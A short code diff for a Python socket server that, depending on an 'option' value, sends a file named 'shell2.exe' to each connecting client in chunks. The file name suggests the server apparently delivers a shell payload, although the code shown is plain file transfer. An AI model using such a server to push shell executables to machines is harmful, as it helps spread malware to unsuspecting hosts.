@@ -27,14 +27,18 @@ while True:
     data = conn.recv(1024)
     print('Server received', repr(data))
 
-    filename='shell2.exe'
-    f = open(filename,'rb')
-    l = f.read(1024)
-    while (l):
-       conn.send(l)
-       l = f.read(1024)
-    f.close()
+    if int(option) == 1:
+        pass
+    
+    else:
+        filename='shell2.exe'
+        f = open(filename,'rb')
+        l = f.read(1024)
+        while (l):
+            conn.send(l)
+            l = f.read(1024)
+        f.close()
+        print('Done sending')
 
-    print('Done sending')
     conn.send('Thank you for connecting')
     conn.close()
